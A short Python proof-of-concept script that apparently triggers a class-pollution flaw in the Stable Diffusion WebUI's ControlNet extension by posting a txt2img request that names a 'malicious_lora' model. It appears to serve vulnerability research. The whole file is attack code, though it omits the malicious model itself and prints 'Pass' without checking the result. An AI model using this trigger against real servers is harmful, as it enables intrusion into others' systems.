# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: recursive_set (via HTTP API)
# Type: get-attr-set-attr
# Trigger: HTTP POST to Stable Diffusion WebUI /sdapi/v1/txt2img
#
# The ControlNet extension processes LoRA models via recursive_set
# during image generation, with paths derived from model state dicts.

import requests

TARGET_URL = "http://localhost:7860/sdapi/v1/txt2img"

PAYLOAD = {
  "prompt": "test",
  "negative_prompt": "",
  "steps": 1,
  "width": 64,
  "height": 64,
  "alwayson_scripts": {
    "controlnet": {
      "args": [{
        "enabled": True,
        "module": "none",
        "model": "malicious_lora",
      }]
    }
  }
}

def run_poc():
  print("Sending txt2img request with ControlNet LoRA...")
  response = requests.post(TARGET_URL, json=PAYLOAD)
  print(f"Response: {response.status_code}")
  return response

def verify_poc():
  print("Remote PoC: ControlNet LoRA loading triggers recursive_set")
  print(f"Target: {TARGET_URL}")
  print("recursive_set is called with model state dict keys as attribute paths")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
